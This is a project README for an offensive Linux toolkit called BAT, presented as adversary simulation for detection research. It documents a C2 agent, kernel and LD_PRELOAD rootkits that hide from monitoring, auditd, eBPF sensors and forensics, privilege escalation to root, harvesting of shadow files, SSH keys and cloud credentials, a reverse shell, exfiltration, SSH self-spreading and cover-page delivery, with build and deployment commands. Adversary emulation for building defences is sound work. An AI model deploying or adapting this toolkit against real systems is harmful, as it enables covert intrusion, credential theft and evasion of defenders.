# Behavioral Adversary Tracer (BAT)

<img width="1870" height="841" alt="banner0" src="https://github.com/user-attachments/assets/bf636b99-b29f-4470-b731-e6fa50a54ea7" />

---

**BAT** is a realistic, evolving adversary threat model for Linux and Windows. It is not a C2 framework and it is not a rootkit. It is a complete threat simulation platform that integrates C2 communication, kernel-level stealth rootkit modules, userspace evasion, privilege escalation, persistence, process injection, credential harvesting, exfiltration, and lateral movement into a single cohesive adversary. The design goal is to be the most sophisticated and realistic Linux threat achievable in 2026, independent of what any detection system currently catches.

It is the adversary side of a research pair. The Aura framework evolves to detect Bat. Bat evolves to evade Aura. The adversary is never constrained by the detector.

---

<img width="1220" height="2098" alt="ss" src="https://github.com/user-attachments/assets/9d4d6df7-343b-4f8e-af64-b20cd8018d67" />


## Quick Start

### 1. Prerequisites

```bash
apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu golang-go
go install mvdan.cc/garble@latest
```

### 2. Configure

```bash
cp build.env.example build.env
nano build.env      # RELAY_IP, SECRET, BAT_KEY, CDN_DOMAIN
```

Generate a secret: `openssl rand -hex 16`

### 3. Build

```bash
./build.sh              # garble agent (x86_64+arm64) + server (arm64) + netshell
./build.sh agent        # agent only
./build.sh server       # server arm64 only (EC2 / Mac M-series)
./build.sh server-amd64 # server x86_64 only (PC Intel/AMD)
./build.sh netshell     # netshell only
```

Binaries land in `bin/`.

### 4. Bootstrap the relay

```bash
# on the relay VPS (as root)
sudo bash -s -- --tg-token $TG_TOKEN --tg-chat-id $TG_CHAT_ID < relay/setup.sh

# from the operator machine
source build.env
relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc --tg
scp -i $BAT_KEY bin/netshell-v11-{x86_64,arm64} ubuntu@$RELAY_IP:/var/www/nexus/agents/
```

### 5. Run

```bash
./bin/bat-server-v11-arm64          # tunnel starts automatically, no flags needed
```

Deploy an agent on the target:

```bash
sudo setsid /path/to/bat-agent-v11-x86_64 </dev/null >/tmp/.log 2>&1 &
disown
```

Agent appears in `bat-server` as `<agentID>@<hostname>` within one beacon interval (default 30s).

---

## Linux Stealth Layer: [Singularity](https://github.com/MatheuZSecurity/Singularity)

The kernel stealth layer (`bat-stealth.ko`, source in `kperf-qos/`) is built directly on top of **Singularity**, an advanced kernel rootkit research framework. Four core modules were ported and adapted:

**`bpf_hook`**: Intercepts `bpf(2)` and all eBPF communication primitives. Any eBPF sensor receives zero telemetry for hidden PIDs. Adapted: `ARCH_SYS("bpf")` replaces the x86-only `__x64_sys_bpf`; `__ia32_sys_bpf` removed for ARM64; `HIDDEN_PORT` replaced by a sysfs-configurable global.

**`hiding_fs`**: Complete filesystem erasure: `getdents64`/`getdents` filtering, `stat`/`statx`/`newfstatat` nlink adjustment, `openat`/`access`/`faccessat` `/proc/<pid>` blocking, chdir and readlink blocking. Merged from five Singularity modules (`hiding_directory`, `hiding_stat`, `open`, `hiding_chdir`, `hiding_readlink`). Adapted: `REGS_ARGn` macros replace direct register access; `should_hide_path()` extended for runtime-configured `bat_hidden_paths[]`.

**`hide_module`**: Removes `bat-stealth.ko` from all kernel module lists. Extended: Singularity already saves `list.prev`; this version saves both `list.prev` and `list.next` and poisons both to block traversal in either direction. Added `module_unhide()` for reversible removal, required by K-99 before `delete_module(2)` can locate the module by name.

**`lkrg_bypass`**: Suppresses LKRG enforcement for hidden processes: hooks signal delivery to block `SIGKILL` for hidden tasks, hooks `vprintk_emit` to drop LKRG log messages, disables UMH validation during agent execution. Ported directly with no architectural changes.

The following modules were developed independently:

- `become_root`: signal 59 hook that calls `commit_creds(prepare_kernel_cred(NULL))` to grant uid=0 (K-03)
- `selfdefense`: blocks LiME memory acquisition, hides kallsyms entries, blocks kprobes on agent symbols, re-hides the module on any enumeration attempt
- `audit`: suppresses auditd events for hidden PIDs
- `sysrq_hook`: intercepts SysRq-T to exclude hidden processes from task dumps
- `taskstats_hook`: filters NETLINK taskstats responses for hidden PIDs
- `reset_tainted` + `clear_taint_dmesg`: zeroes `/proc/sys/kernel/tainted` and filters dmesg lines containing module load evidence
- `hooks_write`: intercepts all kernel write paths (write/splice/sendfile/tee + io_uring_enter/enter2 + ia32 compat) to drop log entries matching agent strings before they reach syslog or journald
- `pid_manager`: fork tracepoint to maintain the hidden PID set across child processes

The full stack makes the agent and all its artifacts invisible to: `ps`, `top`, `ss`, `netstat`, `lsof`, filesystem traversal on hidden paths, `lsmod`, sysfs, kallsyms, auditd, all eBPF sensors, LKRG, LiME, and SysRq forensics.

---

## MITRE ATT&CK Coverage

| ATT&CK ID | Technique | Bat Implementation |
|---|---|---|
| T1036.005 | Masquerading: Match Legitimate Name | TTP 1: `prctl(PR_SET_NAME)` to `kworker/0:1` |
| T1055 | Process Injection | TTP 11: shellcode + rawsock thread injected into live process |
| T1205.001 | Traffic Signaling (Magic Packet) | UDP/ICMP trigger wakes agent from dormancy |
| T1071.001 | Web Protocols C2 | HTTPS beacons over :443 or :9443 |
| T1573.001 | Encrypted Channel: Symmetric | HMAC-SHA256 authenticated beacons over TLS |
| T1090.004 | Proxy: Domain Fronting | CDN profile routes agent traffic through an edge proxy layer |
| T1574.006 | Hijack Execution: LD_PRELOAD | TTP 10: `bat-rootkit.so` via `/etc/ld.so.preload` |
| T1014 | Rootkit | `bat-stealth.ko`: hides PIDs, ports, files, module, self |
| T1562.001 | Impair Defenses: Disable Tools | `bpf_hook` blinds eBPF sensors; `lkrg_bypass` disables LKRG |
| T1562.012 | Impair Defenses: Disable Linux Audit | `audit` module suppresses auditd events for hidden PIDs |
| T1068 | Privilege Escalation via Exploitation | K-03: signal 59 triggers `commit_creds` to uid=0 |
| T1543.002 | Create/Modify System Process: Systemd | TTP 6: systemd unit persistence |
| T1053.003 | Scheduled Task: Cron | TTP 6: crontab persistence |
| T1070.002 | Clear Linux Logs | `clear_taint_dmesg` filters dmesg; `reset_tainted` zeroes taint flag; `hooks_write` drops log entries in-kernel |
| T1070.004 | Indicator Removal: File Deletion | TTP 222 destruct: full artifact wipe |
| T1003 | Credential Dumping | TTP 7/23: `/etc/shadow`, shell history, env secrets |
| T1552.004 | Unsecured Credentials: Private Keys | TTP 21: SSH keys, known_hosts, configs |
| T1552.005 | Cloud Instance Metadata | TTP 23: AWS IMDS credential harvest |
| T1018 | Remote System Discovery | TTP 20/34: ARP enumeration + /16 CIDR scan |
| T1046 | Network Service Scanning | TTP 20/34: TCP port scan of discovered hosts |
| T1021.004 | Lateral Movement via SSH | TTP 22/35: SCP self to discovered host, exec detached |
| T1078 | Valid Accounts | TTP 22/35: lateral move uses harvested SSH keys |
| T1048 | Exfiltration Over Alternative Protocol | TTP 30/31/32: file and directory exfil over beacon channel |
| T1059.004 | Unix Shell Execution | TTP 4: arbitrary command execution |
| T1027 | Obfuscated Files or Information | garble `-literals -tiny -seed=random`; XOR(0x5A) config encoding |
| T1620 | Reflective Code Loading | TTP 11: shellcode executed in target process address space; bat-stealth.ko loaded via memfd_create |

---

## Architecture

```
Target                    Relay (VPS)                     Operator (local)

bat-agent --HTTPS:443-->  nginx:443 -> :8443 --tunnel-->  bat-server:9443
          --TCP:9443 -->  sshd:9443           --tunnel-->
          --UDP/ICMP -->  (trigger forwarded)

bat-agent --HTTPS:9444->  kcc-server:9444                 (kernel compile)
```

| Component | Role |
|---|---|
| `bat-agent` | Agent. Beacons, executes TTPs. Garble-obfuscated. |
| `bat-server` | Operator console. Interactive CLI. Manages all agents. |
| `netshell` | Delivery binary. Looks like a system tool; is a full agent. |
| `bat-rootkit.so` | LD_PRELOAD userspace rootkit. Hides files, PIDs, ports, env vars. |
| `bat-stealth.ko` | Kernel stealth layer (Singularity-based). |
| `kcc-server` | Relay service. Compiles `bat-stealth.ko` on demand for the target's running kernel. |
| `relay/` | Relay infrastructure: nginx, TLS, setup, sync, delivery scripts. |

---

## Bypassed Defenses

| Category | Defense | Bypass Mechanism |
|---|---|---|
| Process monitoring | `ps` / `top` / `/proc` listing | `hiding_procs.c`: `getdents64` hook removes agent PID entries from procfs before userspace reads them |
| Process monitoring | `/proc/<pid>/status`, `/proc/<pid>/cmdline` | `hiding_procs.c`: `filldir` hook filters PID prefixes from all readdir results |
| Filesystem | `ls` / `find` over agent files and directories | `hiding_fs.c`: `getdents64`/`getdents` hooks on targeted paths; stat nlink adjusted to match |
| Filesystem | `lsattr` / `chattr` detection | `hiding_fs.c`: `ioctl` intercept on agent file paths |
| Filesystem | `/proc/modules` / `lsmod` listing | `hiding_module.c`: removes `bat-stealth.ko` entry from all sysfs and procfs module lists |
| Network | `ss` / `netstat` port listings | `hiding_net.c`: `tcp4_seq_show`/`tcp6_seq_show` hooks strip C2 port entries from output |
| Network | `/proc/net/tcp`, `/proc/net/tcp6` | `hiding_net.c`: seq_file read interception drops C2 socket rows |
| Logs | `syslog` / `journald` write path | `hooks_write.c`: `write`/`splice`/`sendfile`/`tee` intercept; log entries matching agent strings are discarded in-kernel |
| Logs | `io_uring` async write path | `hooks_write.c`: `io_uring_enter`/`io_uring_enter2` intercepted; ia32 compat path covered |
| Kernel security | `rkhunter` / `chkrootkit` | Module hidden from `/proc/modules`; agent files hidden from filesystem; zero warnings verified |
| Kernel security | ClamAV | Garble `-literals -tiny` obfuscation + no embedded cleartext strings; 0 detections verified (DB 2026-04-20) |
| EDR / eBPF | eBPF-based sensors reading `/proc` | Hiding hooks intercept at kernel level before eBPF ring buffer events are produced |
| Kernel introspection | `ftrace` / `kprobes` on agent symbols | `selfdefense` module blocks kprobe attachment on agent function addresses |
| Kernel forensics | LiME memory acquisition | `selfdefense` blocks LiME module load and raw memory device access |
| Kernel forensics | SysRq-T task dump | `sysrq_hook` excludes hidden processes from the task list written by SysRq-T |
| Kernel forensics | NETLINK taskstats | `taskstats_hook` filters taskstats NETLINK responses for hidden PIDs |
| Kernel integrity | LKRG enforcement | `lkrg_bypass` suppresses LKRG `SIGKILL` delivery and drops LKRG log messages |
| Audit subsystem | `auditd` syscall recording | `audit` module suppresses audit events for all hidden PIDs at the kernel audit layer |

---

## Syscall Hooks

All hooks are installed by `bat-stealth.ko` via ftrace at load time. ia32 entries are compiled in only on x86_64 (`#ifdef ARCH_SYS_IA32`).

| Syscall / Function | Module | Purpose |
|---|---|---|
| `getdents64` | `hiding_procs.c` | Hide agent PIDs from `/proc` directory listings |
| `getdents` | `hiding_procs.c` | 32-bit compat: hide agent PIDs |
| `filldir` (readdir) | `hiding_procs.c` | Supplemental proc entry filter for legacy readdir callers |
| `getdents64` | `hiding_fs.c` | Hide agent files from directory listings |
| `getdents` | `hiding_fs.c` | 32-bit compat: hide agent files |
| `ia32_getdents64` | `hiding_fs.c` | x86 compat syscall |
| `ia32_getdents` | `hiding_fs.c` | x86 compat syscall |
| `ia32_stat` / `ia32_lstat` / `ia32_fstat` | `hiding_fs.c` | 32-bit stat intercepts for hidden paths |
| `ia32_open` / `ia32_openat` / `ia32_access` | `hiding_fs.c` | 32-bit open/access intercepts |
| `ia32_readlink` | `hiding_fs.c` | 32-bit readlink intercept |
| `ia32_chdir` | `hiding_fs.c` | 32-bit chdir intercept |
| `ioctl` | `hiding_fs.c` | Intercept `lsattr`/`chattr` ioctl on agent paths |
| `tcp4_seq_show` | `hiding_net.c` | Hide C2 port entries from `/proc/net/tcp` |
| `tcp6_seq_show` | `hiding_net.c` | Hide C2 port entries from `/proc/net/tcp6` |
| `bpf` | `bpf_hook.c` | Zero telemetry for hidden PIDs in all eBPF programs |
| `write` | `hooks_write.c` | Drop log entries containing agent strings before reaching syslog |
| `splice` | `hooks_write.c` | Same interception via splice path |
| `sendfile` | `hooks_write.c` | Same interception via sendfile path |
| `tee` | `hooks_write.c` | Same interception via tee path |
| `io_uring_enter` | `hooks_write.c` | io_uring async write interception |
| `io_uring_enter2` | `hooks_write.c` | io_uring async write interception (v2 syscall) |
| `sched_process_fork` (tracepoint) | `pid_manager.c` | Inherit hidden status across `fork`/`clone` |
| `vprintk_emit` | `lkrg_bypass.c` | Drop LKRG kernel log messages |
| `finit_module` / `init_module` | agent (kcc loader) | Fileless kernel module load via `memfd_create` + anonymous fd |

---

## TTP Reference

| TTP | Name | Description |
|---|---|---|
| 1 | masquerade | Rename process comm to `kworker/0:1` (or custom) |
| 2 | reverse_shell | Reverse TCP shell to relay:4445 |
| 3 | memory_rwx | Allocate anonymous RWX memory (detection probe) |
| 4 | shell_exec | Execute arbitrary shell command |
| 5 | beacon | Force immediate extra check-in |
| 6 | persist | Install persistence (cron / systemd / rc.local / openrc / profile / XDG autostart) |
| 7 | creddump | Harvest `/etc/shadow`, bash history, env secrets, AWS IMDS |
| 9 | exec_chain | Spawn process chain (detection probe) |
| 10 | install_rootkit | Deploy `bat-rootkit.so` via `/etc/ld.so.preload` |
| 11 | inject + exit | Inject beacon + rawsock threads into live process, then self-exit |
| 20 | network_recon | ARP table + TCP :22 scan of local subnet |
| 21 | ssh_harvest | Collect private keys, known_hosts, authorized_keys, configs |
| 22 | lateral_move | SCP self to discovered host via SSH, exec detached |
| 23 | creddump_full | Extended credential harvest + environment fingerprint |
| 30 | exfil-file | Read arbitrary file and transmit base64 chunks over beacon channel |
| 31 | exfil-dir | Tar+gzip a directory and exfiltrate over beacon channel |
| 32 | exfil-auto | Watch configured paths and auto-exfiltrate on change |
| 34 | netmap | Scan /16 CIDR for live hosts and open ports |
| 35 | autospread | SSH lateral movement to discovered hosts using harvested keys; copies agent and executes detached |
| 36 | smbprobe | SMB port probe (:445) for lateral movement candidates |
| 99 | kill | Silent self-termination |
| 222 | destruct | Remove all artifacts, wipe memory, exit |
| 1003 | K-03 (privesc) | Kernel signal 59 triggers `commit_creds` to uid=0 |
| 1099 | K-99 (unload) | Two-phase `bat-stealth.ko` unload via sysfs + raw `delete_module(2)` |

Console commands (in `bat-server` prompt):
- `kill`: TTP 99 to all agents
- `destruct`: TTP 222 to all agents
- `destruct @<agentID>`: targeted wipe

---


### KCC: Kernel Compile Cache

`bat-stealth.ko` is compiled on demand for the target's running kernel. The agent automates the full flow at runtime; no pre-built module is required per target:

1. **Detect kernel**: agent reads `/proc/version` to obtain the exact `uname -r` string.
2. **Request compilation**: agent POSTs the kernel string to `kcc-server` (`:9444`) with an HMAC-signed request.
3. **kcc-server compiles**: server builds `bat-stealth.ko` against the matching kernel headers and caches the result by kernel hash.
4. **Receive module bytes**: compiled `.ko` returned in the response body.
5. **Fileless load**: agent creates an anonymous memory file (`memfd_create`, syscall 279 on x86_64 / 319 on ARM64), writes the module bytes, then calls `finit_module` (syscall 273 / 313) with an empty params string.
6. **Registration**: module registers all hooks and hides itself from sysfs/procfs within milliseconds.

No `.ko` file is written to disk at any point. The module vanishes from `/proc/modules` immediately after load.

**Minimum kernel:** 6.x (K-00 probe; agent skips stealth load on older kernels).  
**Tested:** 6.1.0 (Debian 12 / Ubuntu LTS), 6.8.0 (Ubuntu 22.04 GCP).

---

## Build Profiles

```bash
make lab SECRET=<hex>          # direct: agent -> relay:9443, UDP trigger
make cdn SECRET=<hex>          # CDN: agent -> edge proxy -> relay:443
make singularity SECRET=<hex>  # ICMP trigger only, no UDP port exposure
```

All profiles require `SECRET=`. Override relay IP with `RELAY=<ip>`.

---

## Security Model

- **HMAC-authenticated beacons**: every check-in signed with `SHA-256(secret)`; replays rejected server-side.
- **Two-layer config obfuscation**: XOR(0x5A) encoding at codegen time, then garble `-literals` encryption at compile time. `-X ldflags` intentionally avoided (ldflag values appear plaintext in binaries).
- **No operator-side listening ports**: all connectivity flows outbound through the SSH reverse tunnel embedded in `bat-server`.
- **SSH key baked into server**: tunnel key compiled in via the same XOR encoding as the C2 config.

---

## Cover Page

`relay/static/` is the relay's public face. The release ships a bare placeholder. Replace `index.html` and supporting pages with your cover identity before running `sync.sh`. Delivery scripts (`static/i`, `static/api/setup`, `static/api/v1/index.json`) use `__CDN_DOMAIN__` as a placeholder; set `CDN_DOMAIN=` in `build.env` and `sync.sh` substitutes it automatically. Update `relay/nginx/bat.conf` with the real domain in `server_name` and TLS cert paths before the first nginx deploy.

The CDN profile routes agent traffic through an edge proxy layer. The agent connects to the CDN domain over HTTPS; the proxy forwards traffic to the relay's local listener over the SSH reverse tunnel. From a network perspective, all agent traffic originates from CDN edge IP ranges rather than the relay VPS.

### Delivery Notifications via Telegram

---
<img width="1220" height="2028" alt="tg" src="https://github.com/user-attachments/assets/50a0ffb6-44fc-4f0b-8757-614fd9ca0285" />
---


When a target fetches the agent binary from the CDN endpoint, a delivery alert is dispatched instantly to a configured Telegram channel. The notification includes: source IP, timestamp, request path, detected architecture (x86_64/arm64), file size, User-Agent string, and CDN edge identifier.

The `delivery-alert.service` daemon tails the nginx access log and fires on any hit against the honey download path. Configure during relay bootstrap:

```bash
sudo bash -s -- --tg-token <BOT_TOKEN> --tg-chat-id <CHAT_ID> < relay/setup.sh
```

Credentials are written to `/etc/bat/tg.env` on the relay and propagated to all sync targets via `sync.sh --tg`. The service starts automatically and survives relay restarts.

---

## Disclaimer

This software is developed exclusively for authorized security research, adversary simulation in controlled lab environments, and the development of detection and response capabilities. It contains functional implementations of offensive techniques including kernel-level rootkits, process injection, credential harvesting, and lateral movement. Deployment on any system without explicit written authorization from the system owner is illegal under applicable computer fraud and abuse laws in most jurisdictions.

The authors accept no liability for any damages, legal consequences, or harm resulting from unauthorized, negligent, or malicious use of this software. By using this software, you affirm that you are a qualified security professional operating within a lawful, authorized scope, and that full legal and ethical responsibility for its use rests solely with you.

This software is not to be redistributed, published, or disclosed to any third party without prior written consent.
